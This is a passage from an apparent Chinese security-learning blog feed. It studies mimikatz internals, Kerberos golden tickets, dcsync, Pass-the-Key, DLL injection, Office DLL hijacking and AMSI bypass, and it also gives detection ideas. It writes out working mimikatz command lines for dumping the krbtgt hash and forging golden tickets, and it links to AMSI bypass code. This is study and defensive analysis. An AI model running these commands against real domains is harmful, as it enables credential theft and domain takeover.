Key)加密自身的客户端信息，包括客户端名，ip，时间戳。</li><li>3.客户端向KDC发送要访问的服务端的明文信息。</li><li>4.客户端向KDC发送没改变的TGT。</li></ul></li><li><p>TGS行为：</p><ul><li>1.TGS验证客户端明文发送的服务端信息,如果不存在，则认证结束。</li><li>2.TGS利用自身的秘钥解密TGT，得到时间戳和CT_SK,如果时间超过5mins，则认证结束。</li><li>3.使用CT_SK解密客户端发送的客户端信息，比较这个客户端信息和TGT里面的客户端信息进行比对。如果不同则，认证结束。</li><li>4.KDC发送响应内容给客户端：<ul><li>服务端秘钥加密的Ticket(ST),内容包括：客户端信息，Serivce IP，ST的有效时间，时间戳，以及客户端服务端通信的CS_SK</li><li>使用CT_SK加密的内容，其中包括CS_SK，时间戳,ST的有效期。此时客户端已经使用自身的秘钥解密的第一次通讯接收的第二部分数据，获取了CT_SK，<strong>并进行了缓存</strong>。</li></ul></li></ul></li><li><p>总结：本次通讯，有三个目的，第一：客户端会发送服务端信息以让TGS确认<strong>是否存在服务端</strong>，以及CT_SK加密之后的客户端信息和TGT，以让TGS比较两个数据中保存的<strong>客户端信息是否相同</strong>。并<strong>传递ST和包含CS_SK会话秘钥</strong>的加密数据。</p></li><li>备注：<strong>每一次通讯，KDC都会把下一次通讯所需要的会话秘钥传递给客户端。并且客户端每次都会发送两次包含自身数据的报文给校验者从而校验自身，其中TGT和ST的机器秘钥(TGS和服务端机器秘钥)都不经过传递，保证安全性。</strong></li></ul><h3 id="Kerberos协议第3次通讯"><a href="#Kerberos协议第3次通讯" class="headerlink" title="Kerberos协议第3次通讯"></a>Kerberos协议第3次通讯</h3><ul><li>客户端行为<ul><li>1.客户端收到KDC的响应，解密有CT_SK加密的第二部分数据，确认无误后，<strong>并获取CS_SK会话秘钥</strong>继续。</li><li>2.客户端使用CS_SK将自己主机信息和时间戳加密发送给服务端</li><li>3.客户端将第二次通讯获得的服务端凭证ST发送给服务端</li></ul></li><li><p>服务端行为</p><ul><li>1.服务端接收到客户端发来的两部分数据后，服务端使用服务端秘钥解密ST，校验时间戳。</li><li>2.使用CS_SK解密客户端发来的第一部分数据，得到TGS认证过的客户端信息。然后对比这部分数据的客户端信息和经过服务端秘钥加密的ST的客户端信息，判断客户端的合理性。</li><li>3.服务端返回的CT_SK加密的数据，以是的客户端确认服务端身份。就此，Kerberos认证完成。</li></ul></li><li><p>总结：第三次通讯，服务端利用自身的秘钥解密ST，获取其中的客户端信息，然后<strong>比较客户端发来的客户端信息</strong>。从而客户端的合理性。</p></li></ul><p>Ref:<a href="https://seevae.github.io/2020/09/12/详解kerberos认证流程/" target="_blank" rel="external">详解kerberos认证流程</a></p><h2 id="Pass-The-Ticket"><a href="#Pass-The-Ticket" class="headerlink" title="Pass The Ticket"></a>Pass The Ticket</h2><ul><li>Ptt主要在域内进行横向移动的技术。</li></ul><h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><ul><li>特点：有效时间长(默认是十年)，不会因为密码的修改导致票据的失效，用户名可以是任意的虚拟的。</li><li><p>制作黄金票据的前提：</p><ul><li>域名称</li><li>SID</li><li>域的kbrtgt的Hash(要求短暂的拿到域控服务器的控制权)</li><li>任意用户名</li></ul></li><li><p>在域控服务器中(备注，也可以不登录域控即可获取<a href="https://www.freebuf.com/articles/network/286137.html" target="_blank" rel="external">https://www.freebuf.com/articles/network/286137.html</a>)，使用<code>mimikatz.exe &quot;lsadump::dcsync /domain:corp.hacky.ren /user:krbtgt&quot; &gt;&gt; golden.txt</code>,可以得到SID以及kbrtgt的Hash，以及域名称。<br>  <img src="http://hacky.wang/blog/20220224/v1o2BzRHGqRi.png?imageslim" alt="mark"></p></li><li><p>在非域控主机中，使用<code>mimikatz.exe &quot;kerberos::golden /admin:hacky /domain:corp.hacky.ren /sid:S-1-5-21-442036050-123597327-3835497791 kbrgtg:ac9a6f3e6ea0f74274725c39179f44a1 /ptt&quot;</code>生成黄金票据，并将其导入内存。</p><ul><li>/admin参数：表示任意伪造的用户名(最好改为受控的主机名，因为部分安全产品是通过检索登录的域账户是否存在而检测PtT)</li><li>/sid:sid数值，取最后一个“-”之前的内容</li><li>/ptt:直接导入内存，这样就不需要使用”kerberos::ptt导入了”<br><img src="http://hacky.wang/blog/20220224/IlxDKwvIESBp.png?imageslim" alt="mark"></li></ul></li><li><p>使用<code>klist</code>或者<code>kerberos::list</code>查看伪造的金票是否被导入。<br>  <img src="http://hacky.wang/blog/20220224/qYBfHpfYehbB.png?imageslim" alt="mark"></p></li><li><p>修改域控服务器密码为abcd.123，然后在远程登录域控，测试金票是否有效。<br>  <img src="http://hacky.wang/blog/20220224/cgK4nT1YidQt.png?imageslim" alt="mark"></p></li><li><p>Ref:</p><ul><li><a href="https://www.freebuf.com/articles/network/286137.html" target="_blank" rel="external">内网渗透测试：DCSync 攻击技术的利用</a></li><li><a href="https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/" target="_blank" rel="external">浅析黄金票据与白银票据</a></li></ul></li></ul><h3 id="lsadump-dcsync-源码分析"><a href="#lsadump-dcsync-源码分析" class="headerlink" title="lsadump::dcsync 源码分析"></a>lsadump::dcsync 源码分析</h3><ul><li><p>原理：不同的域控制器(DC)会进行数据同步复制，mimikatz通过模拟一个域控制器，通过GetNCChanges函数向真实的域控制器发送数据同步复制请求，获取控制器指定的用户的口令Hash。dcsync的主要特点是不需要登录域控服务器而获取用户口令HASH。需要注意的是，DCSync 攻击的对象如果是 RODC 域控制器，则会失效，因为 RODC是不能参与复制同步数据。</p></li><li><p>lsadump::dcsync命令源码位于<code>\mimikatz\modules\lsadump\kuhl_m_lsadump_dc.c</code>中的<code>NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])</code>函数中。</p></li><li><p>首先，通过<code>kull_m_net_getDC(szDomain, DS_DIRECTORY_SERVICE_REQUIRED, &amp;szTmpDc)</code>寻找域内的域控服务器，其本质会调用<code>DsGetDcName</code>API函数。</p></li><li><p>然后，通过<code>IDL_DRSGetNCChanges</code>函数，向真实域控服务器发送请求，以获取用户信息。</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">RtlZeroMemory(<span class="name">&amp;getChRep</span>, sizeof(<span class="name">DRS_MSG_GETCHGREPLY</span>))<span class="comment">;</span></div><div class="line">drsStatus = IDL_DRSGetNCChanges(<span class="name">hDrs</span>, <span class="number">8</span>, <span class="symbol">&amp;getChReq</span>, <span class="symbol">&amp;dwOutVersion</span>, <span class="symbol">&amp;getChRep</span>)<span class="comment">;</span></div></pre></td></tr></table></figure></li><li><p>几个重要的结构体</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">//<span class="type">DRS_MSG_GETCHGREPLY</span>:用于接收<span class="type">IDL_DRSGetNCChanges</span>传来的响应消息</div><div class="line">typedef union _DRS_MSG_GETCHGREPLY &#123;</div><div class="line"><span class="type">DRS_MSG_GETCHGREPLY_V6</span> <span class="type">V6</span>;</div><div class="line">&#125; <span class="type">DRS_MSG_GETCHGREPLY</span>;</div><div class="line">//////</div><div class="line">//<span class="type">DRS_MSG_GETCHGREPLY_V6</span>表示<span class="type">DRS_MSG_GETCHGREPLY</span>的第六个版本</div><div class="line">typedef struct _DRS_MSG_GETCHGREPLY_V6 &#123;</div><div class="line"><span class="type">UUID</span> uuidDsaObjSrc;</div><div class="line"><span class="type">UUID</span> uuidInvocIdSrc;</div><div class="line"><span class="type">DSNAME</span> *pNC;</div><div class="line"><span class="type">USN_VECTOR</span> usnvecFrom;</div><div class="line"><span class="type">USN_VECTOR</span> usnvecTo;</div><div class="line"><span class="type">UPTODATE_VECTOR_V2_EXT</span> *pUpToDateVecSrc;</div><div class="line"><span class="type">SCHEMA_PREFIX_TABLE</span> <span class="type">PrefixTableSrc</span>;</div><div class="line"><span class="type">ULONG</span> ulExtendedRet;</div><div class="line"><span class="type">ULONG</span> cNumObjects;</div><div class="line"><span class="type">ULONG</span> cNumBytes;</div><div class="line"><span class="type">REPLENTINFLIST</span> *pObjects;</div><div class="line"><span class="type">BOOL</span> fMoreData;</div><div class="line"><span class="type">ULONG</span> cNumNcSizeObjects;</div><div class="line"><span class="type">ULONG</span> cNumNcSizeValues;</div><div class="line"><span class="type">DWORD</span> cNumValues;</div><div class="line"><span class="type">REPLVALINF_V1</span> *rgValues;</div><div class="line"><span class="type">DWORD</span> dwDRSError;</div><div class="line">&#125; <span class="type">DRS_MSG_GETCHGREPLY_V6</span>;</div><div class="line">/////////</div><div class="line">//<span class="type">PrefixTableSrc</span>定义了从<span class="type">OID</span>到<span class="type">ATTRTYP</span>值的映射表</div><div class="line">typedef struct _SCHEMA_PREFIX_TABLE &#123;</div><div class="line"><span class="type">DWORD</span> <span class="type">PrefixCount</span>;   //<span class="type">PrefixTableEntry</span>的数量</div><div class="line"><span class="type">PrefixTableEntry</span> *pPrefixEntry; //包含了<span class="type">PrefixTableEntry</span>的数组</div><div class="line">&#125; <span class="type">SCHEMA_PREFIX_TABLE</span>;</div><div class="line">////</div><div class="line">//<span class="type">REPLENTINFLIST</span>包含了给定对象(<span class="type">Object</span>)的一个或多个属性</div><div class="line"> typedef struct <span class="type">REPLENTINFLIST</span> &#123;</div><div class="line">   struct <span class="type">REPLENTINFLIST</span>* pNextEntInf;</div><div class="line">   <span class="type">ENTINF</span> <span class="type">Entinf</span>;</div><div class="line">   <span class="type">BOOL</span> fIsNCPrefix;</div><div class="line">   <span class="type">UUID</span>* pParentGuid;</div><div class="line">   <span class="type">PROPERTY_META_DATA_EXT_VECTOR</span>* pMetaDataExt;</div><div class="line"> &#125; <span class="type">REPLENTINFLIST</span>;</div><div class="line">/////</div><div class="line">//<span class="type">AttrBlock</span> 简单的理解为属性块</div></pre></td></tr></table></figure></li><li><p>kuhl_m_lsadump_dcsync_descrObject()函数解析/描述对象，其函数原型如下,其中第一个参数prefixTable和第二个参数attributes分别表示OID和ATTRTYP的映射表，AttrBlock表示一个属性块。其最终会返回一个<code>ATTRVALBLOCK</code>结构</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">void kuhl_m_lsadump_dcsync_descrObject(<span class="keyword">SCHEMA_PREFIX_TABLE </span>*<span class="keyword">prefixTable, </span></div><div class="line">ATTRBLOCK *attributes, </div><div class="line">LPCWSTR szSrcDomain, </div><div class="line"><span class="keyword">BOOL </span>someExport, </div><div class="line">ATTRTYP *pSuppATT_IntId, </div><div class="line">DWORD cSuppATT_IntId)</div></pre></td></tr></table></figure></li><li><p>kuhl_m_lsadump_dcsync_descrObject最终会调用kull_m_rpc_drsr_findMonoAttr用户获取指定OID对应的属性值，其中最最最重要的是<code>kull_m_rpc_drsr_findAttr</code>函数，其函数原型如下。其会调用<code>kull_m_rpc_drsr_MakeAttid</code>函数，通过传入的OID生成一个ATTRTYP结构。</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ATTRVALBLOCK * kull_m_rpc_drsr_findAttr(</div><div class="line">SCHEMA_PREFIX_TABLE *prefixTable, </div><div class="line">ATTRBLOCK *attributes, </div><div class="line">LPCSTR szOid)</div></pre></td></tr></table></figure></li><li><p>kull_m_rpc_drsr_MakeAttid函数源码如下,很显然，kull_m_rpc_drsr_MakeAttid()首先会截取OID的最后一个数字，接着调用kull_m_rpc_drsr_MakeAttid_addPrefixToTable()取ndx。然后将取到的ndx左移16位，再或运算之后，得到ATTRTYP，这其实是一个ULONG类型。</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">BOOL</span> kull_m_rpc_drsr_MakeAttid(SCHEMA_PREFIX_TABLE *prefixTable, LPCSTR szOid, ATTRTYP *att, <span class="built_in">BOOL</span> toAdd)</div><div class="line">&#123;</div><div class="line"><span class="built_in">BOOL</span> status = <span class="literal">FALSE</span>;</div><div class="line">DWORD lastValue, ndx;</div><div class="line">PSTR lastValueString;</div><div class="line">OssEncodedOID oidPrefix;</div><div class="line"><span class="keyword">if</span>(lastValueString = strrchr(szOid, <span class="string">'.'</span>))</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span>(*(lastValueString + <span class="number">1</span>))</div><div class="line">&#123;</div><div class="line">lastValueString++;</div><div class="line">lastValue = strtoul(lastValueString, <span class="literal">NULL</span>, <span class="number">0</span>);</div><div class="line">*att = (WORD) lastValue % <span class="number">0x4000</span>;</div><div class="line"><span class="keyword">if</span>(*att &gt;= <span class="number">0x4000</span>)</div><div class="line">*att += <span class="number">0x8000</span>;</div><div class="line"><span class="keyword">if</span>(kull_m_asn1_DotVal2Eoid(szOid, &amp;oidPrefix))</div><div class="line">&#123;</div><div class="line">oidPrefix.length -= (lastValue &lt; <span class="number">0x80</span>) ? <span class="number">1</span> : <span class="number">2</span>;</div><div class="line"><span class="keyword">if</span>(status = kull_m_rpc_drsr_MakeAttid_addPrefixToTable(prefixTable, &amp;oidPrefix, &amp;ndx, toAdd))</div><div class="line">&#123;</div><div class="line">*att |= ndx &lt;&lt; <span class="number">16</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> PRINT_ERROR(L<span class="string">"kull_m_rpc_drsr_MakeAttid_addPrefixToTable\n"</span>);</div><div class="line">kull_m_asn1_freeEnc(oidPrefix.value);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> status;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>然后通过kull_m_rpc_drsr_findAttrNoOID()遍历整个ATTRBLOCK,ATTRBLOCK结构如下，包含了一个Count表示，ATTR列表的个数，ATTR为一个列表。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">typedef struct _ATTRBLOCK &#123;</div><div class="line">ULONG attrCount;</div><div class="line">ATTR *pAttr;</div><div class="line">&#125; ATTRBLOCK;</div><div class="line">/<span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">/</span></div><div class="line"><span class="regexp">/</span><span class="regexp">//</span>函数实现如下：</div><div class="line">ATTRVALBLOCK * kull_m_rpc_drsr_findAttrNoOID(ATTRBLOCK *attributes, ATTRTYP type)</div><div class="line">&#123;</div><div class="line">ATTRVALBLOCK *ptr = NULL;</div><div class="line">DWORD i;</div><div class="line">ATTR *attribut;</div><div class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; attributes-&gt;attrCount; i++)</div><div class="line">&#123;</div><div class="line">attribut = &amp;attributes-&gt;pAttr[i];</div><div class="line">if(attribut-&gt;attrTyp == type)</div><div class="line">&#123;</div><div class="line">ptr = &amp;attribut-&gt;AttrVal;</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> ptr;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>最后，就可以根据ATTRVALBLOCK结构，得到具体的属性值。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="title">typedef</span> struct _ATTRVAL &#123;</div><div class="line"><span class="type">ULONG</span> valLen;</div><div class="line"><span class="type">UCHAR</span> *pVal;</div><div class="line">&#125; <span class="type">ATTRVAL</span>;</div><div class="line"><span class="title">typedef</span> struct _ATTRVALBLOCK &#123;</div><div class="line"><span class="type">ULONG</span> valCount;</div><div class="line"><span class="type">ATTRVAL</span> *pAVal;</div><div class="line">&#125; <span class="type">ATTRVALBLOCK</span>;</div><div class="line">/////函数实现</div><div class="line"><span class="type">PVOID</span> kull_m_rpc_drsr_findMonoAttr(<span class="type">SCHEMA_PREFIX_TABLE</span> *prefixTable, <span class="type">ATTRBLOCK</span> *attributes, <span class="type">LPCSTR</span> szOid, <span class="type">PVOID</span> <span class="class"><span class="keyword">data</span>, <span class="type">DWORD</span> *size)</span></div><div class="line">&#123;</div><div class="line"><span class="type">PVOID</span> ptr = <span class="type">NULL</span>;</div><div class="line"><span class="type">ATTRVALBLOCK</span> *valblock;</div><div class="line"><span class="keyword">if</span>(<span class="class"><span class="keyword">data</span>)</span></div><div class="line">*(<span class="type">PVOID</span> *)<span class="class"><span class="keyword">data</span> = <span class="type">NULL</span>;</span></div><div class="line"><span class="keyword">if</span>(size)</div><div class="line">*size = <span class="number">0</span>;</div><div class="line"><span class="keyword">if</span>(valblock = kull_m_rpc_drsr_findAttr(prefixTable, attributes, szOid))  //得到据<span class="type">ATTRVALBLOCK</span>结构</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span>(valblock-&gt;valCount == <span class="number">1</span>)</div><div class="line">&#123;</div><div class="line">ptr = valblock-&gt;pAVal[<span class="number">0</span>].pVal;</div><div class="line"><span class="keyword">if</span>(<span class="class"><span class="keyword">data</span>)</span></div><div class="line">*(<span class="type">PVOID</span> *)<span class="class"><span class="keyword">data</span> = ptr;</span></div><div class="line"><span class="keyword">if</span>(size)</div><div class="line">*size = valblock-&gt;pAVal[<span class="number">0</span>].valLen;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">return ptr;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>SID和NTLM</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">if(kull_m_rpc_drsr_findMonoAttr(<span class="keyword">prefixTable, </span>attributes, szOID_ANSI_objectSid, &amp;data, NULL))</div><div class="line">&#123;</div><div class="line">kprintf(L<span class="string">"Object Security ID   : "</span>)<span class="comment">;</span></div><div class="line">kull_m_string_displaySID(data)<span class="comment">;</span></div><div class="line">kprintf(L<span class="string">"\n"</span>)<span class="comment">;</span></div><div class="line">rid = *GetSidSubAuthority(data, *GetSidSubAuthorityCount(data) - <span class="number">1</span>)<span class="comment">;</span></div><div class="line">kprintf(L<span class="string">"Object Relative ID   : %u\n"</span>, rid)<span class="comment">;</span></div><div class="line">kprintf(L<span class="string">"\nCredentials:\n"</span>)<span class="comment">;</span></div><div class="line">if(kull_m_rpc_drsr_findMonoAttr(<span class="keyword">prefixTable, </span>attributes, szOID_ANSI_unicodePwd, &amp;encodedData, &amp;encodedDataSize))</div><div class="line">kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, rid, L<span class="string">"NTLM"</span>, FALSE)<span class="comment">;</span></div><div class="line">if(kull_m_rpc_drsr_findMonoAttr(<span class="keyword">prefixTable, </span>attributes, szOID_ANSI_ntPwdHistory, &amp;encodedData, &amp;encodedDataSize))</div><div class="line">kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, rid, L<span class="string">"ntlm"</span>, TRUE)<span class="comment">;</span></div><div class="line">if(kull_m_rpc_drsr_findMonoAttr(<span class="keyword">prefixTable, </span>attributes, szOID_ANSI_dBCSPwd, &amp;encodedData, &amp;encodedDataSize))</div><div class="line">kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, rid, L<span class="string">"LM  "</span>, FALSE)<span class="comment">;</span></div><div class="line">if(kull_m_rpc_drsr_findMonoAttr(<span class="keyword">prefixTable, </span>attributes, szOID_ANSI_lmPwdHistory, &amp;encodedData, &amp;encodedDataSize))</div><div class="line">kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, rid, L<span class="string">"lm  "</span>, TRUE)<span class="comment">;</span></div></pre></td></tr></table></figure></li></ul><h3 id="kerberos-golden-源码分析"><a href="#kerberos-golden-源码分析" class="headerlink" title="kerberos::golden 源码分析"></a>kerberos::golden 源码分析</h3><ul><li><a href="https://www.anquanke.com/post/id/257703" target="_blank" rel="external">mimikatz源码学习-Kerberos模块</a></li><li><a href="http://evilash.me/2021/12/24/Analyse-NoPac.html" target="_blank" rel="external">解析CVE-2021-42278和CVE-2021-42287</a>主要学习PAC结构</li></ul><h3 id="Pass-The-Ticket-检测"><a href="#Pass-The-Ticket-检测" class="headerlink" title="Pass The Ticket 检测"></a>Pass The Ticket 检测</h3><ul><li>在域控侧</li><li>1.在前期(也就是lsadump::dcsync)，通过检测流量定位DsGetNcChanges流量，判断来源IP是否是已知的域控ip地址。</li><li>2.在中期(也就是kerseros::ptt命令），通过检测流量，寻找在通讯流量中，缺省Kerberos通讯过程中第二第二步。因为黄金票据是伪造TGT的，自然不会有TGT请求的流量。</li><li>3.在后期，通过获取windows 事件，寻找关键的日志ID，进行分析<ul><li>3.1 寻找关键的ID(例如4769)</li><li>3.2 ID为4769的Kerberos登录事件中，登录的账户不在域中，说明是伪造的！因为这个账户可以是任意的<br>在非域控侧<br>1.检测mimikatz工具(有特征，例如yara，或者命令行)</li></ul></li></ul><h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><h3 id="Pass-The-Key"><a href="#Pass-The-Key" class="headerlink" title="Pass The Key"></a>Pass The Key</h3><ul><li>又称为OverPass-The-Hash，因为在安装了KB2871997补丁的系统中，常规的非Administator账户是无法使用PtH进行横向传播的，但是可以使用AES进行Pth。</li><li>mimikatz “privilege::debug” “sekurlsa::ekeys” 获取想要的AES Hash</li><li>mimikatz sekurlsa::pth 进行PtK攻击</li></ul><h2 id="mimikatz检测与防御"><a href="#mimikatz检测与防御" class="headerlink" title="mimikatz检测与防御"></a>mimikatz检测与防御</h2><ul><li>yara检测:<a href="https://github.com/gentilkiwi/mimikatz/blob/master/kiwi_passwords.yar" target="_blank" rel="external">https://github.com/gentilkiwi/mimikatz/blob/master/kiwi_passwords.yar</a>,原理是检测LogonSessionList全局变量的特征码。</li></ul><h2 id="lsadump-sam-源码分析"><a href="#lsadump-sam-源码分析" class="headerlink" title="lsadump::sam 源码分析"></a>lsadump::sam 源码分析</h2><ul><li>Ref<a href="https://zhuanlan.zhihu.com/p/34991269" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/34991269</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;这是学习Mimikatz工作原理的无总结笔记。主要包含了&lt;code&gt;sekurlsa::msv&lt;/code&gt;,&lt;code&gt;sekurlsa::pth&lt;/code&gt;,&lt;code&gt;lsadump::dcsync&lt;/code&gt;,票据传递等功能的原理分析和检测。
    
    </summary>
    
      <category term="攻防技术" scheme="https://findream.github.io/categories/%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>绿盟科技-每周蓝军技术推送（2022.4.9-4.15）学习</title>
    <link href="https://findream.github.io/2022/04/20/%E7%BB%BF%E7%9B%9F%E7%A7%91%E6%8A%80-%E6%AF%8F%E5%91%A8%E8%93%9D%E5%86%9B%E6%8A%80%E6%9C%AF%E6%8E%A8%E9%80%81%EF%BC%882022.4.9-4.15%EF%BC%89/"/>
    <id>https://findream.github.io/2022/04/20/绿盟科技-每周蓝军技术推送（2022.4.9-4.15）/</id>
    <published>2022-04-20T06:02:11.000Z</published>
    <updated>2022-05-23T11:44:50.895Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-绿盟科技-每周蓝军技术推送（2022-4-9-4-15）"><a href="#0x00-绿盟科技-每周蓝军技术推送（2022-4-9-4-15）" class="headerlink" title="0x00 绿盟科技-每周蓝军技术推送（2022.4.9-4.15）"></a>0x00 绿盟科技-每周蓝军技术推送（2022.4.9-4.15）</h2><ul><li>原文链接：<a href="https://mp.weixin.qq.com/s/LN8k0J4lOn-ZV5LmDfSTBQ" target="_blank" rel="external">每周蓝军技术推送（2022.4.9-4.15）</a></li></ul><a id="more"></a><h2 id="0x01-修改内存中的-PE-头来注入-DLL-的一种方法"><a href="#0x01-修改内存中的-PE-头来注入-DLL-的一种方法" class="headerlink" title="0x01 修改内存中的 PE 头来注入 DLL 的一种方法"></a>0x01 修改内存中的 PE 头来注入 DLL 的一种方法</h2><ul><li><p><a href="https://www.x86matthew.com/view_post?id=import_dll_injection" target="_blank" rel="external">这篇文章</a>主要原理是：windows在装载程序的时候会根据导入表的数据装载所需要的Dll文件，<br>这篇文章的原理是通过在程序导出表中添加IID数组，然后在Resume主线程的时候，windows装载器便会加载所需要的dll实现dll注入。</p></li><li><p>这个办法缺点：</p><ul><li>1.是只能注入刚刚启动的进程，</li><li>2.还有敏感函数ResumeThead操作。好处就是不需要CreateRemoteThread函数。</li></ul></li></ul><h2 id="0x02-针对Office的DLL劫持研究"><a href="#0x02-针对Office的DLL劫持研究" class="headerlink" title="0x02 针对Office的DLL劫持研究"></a>0x02 针对Office的DLL劫持研究</h2><ul><li><p><a href="https://medium.com/@tamirye94/office-multiple-search-order-dll-hijacking-67e76001ecf1" target="_blank" rel="external">这篇文章</a>就讲了一个搜索顺序类型的dll劫持，而且现在微软并不认为这算是一个漏洞，所以短时间内应该是不会进行修复的。关于这种类型的dll劫持的检测思路可以是这样的：</p></li><li><p>因为Windows安全dll搜索顺序是这样，针对系统程序来说，其使用的dll多位于系统目录，要想目标dll能被劫持，目标dll的释放路径只可能在应用程序目录。</p><pre><code>1、加载应用程序的目录；2、系统目录，使用GetSystemDirectory函数获取该目录的路径；3、16位系统目录，没有获取该目录路径的函数，但会对该目录进行搜索；4、Windows目录，使用GetWindowsDirectory函数获取该目录的路径；5、当前目录；6、PATH环境变量中列出的目录。</code></pre></li><li>所以，我只需要寻找进程所加载dll的路径和进程路径一致的dll程序，并且在其他目录存在相同文件名称的dll，例如%system32%目录和%windows%。即可认为存在此类dll劫持。</li></ul><h2 id="0x03-AMSI-Bypass-的多种方法整理"><a href="#0x03-AMSI-Bypass-的多种方法整理" class="headerlink" title="0x03 AMSI Bypass 的多种方法整理"></a>0x03 AMSI Bypass 的多种方法整理</h2><ul><li><p>结合<a href="https://www.hackingarticles.in/a-detailed-guide-on-amsi-bypass/" target="_blank" rel="external">这篇文章</a>，目前主要的ByPass AMSI的方法有两种，第1种是Patch amsi.dll文件。第2种是使amsi失效的方法。</p></li><li><p>1.通过patch AmsiScanBuffer函数，主要分为c#语言和ps语言。</p></li></ul><p>ref:<a href="https://gist.github.com/FatRodzianko/c8a76537b5a87b850c7d158728717998#file-my-am-bypass-ps1" target="_blank" rel="external">https://gist.github.com/FatRodzianko/c8a76537b5a87b850c7d158728717998#file-my-am-bypass-ps1</a></p><p>ref:<a href="https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs" target="_blank" rel="external">https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs</a></p><ul><li>2.通过反射Patch AmsiScanBuffer函数地址，为了避免被探测，其首先获取了DllGetClassObject的地址，然后通过暴力搜索特征码的方式获取AmsiScanBuffer进行patch</li></ul><p>ref:<a href="https://gist.github.com/shantanu561993/6483e524dc225a188de04465c8512909" target="_blank" 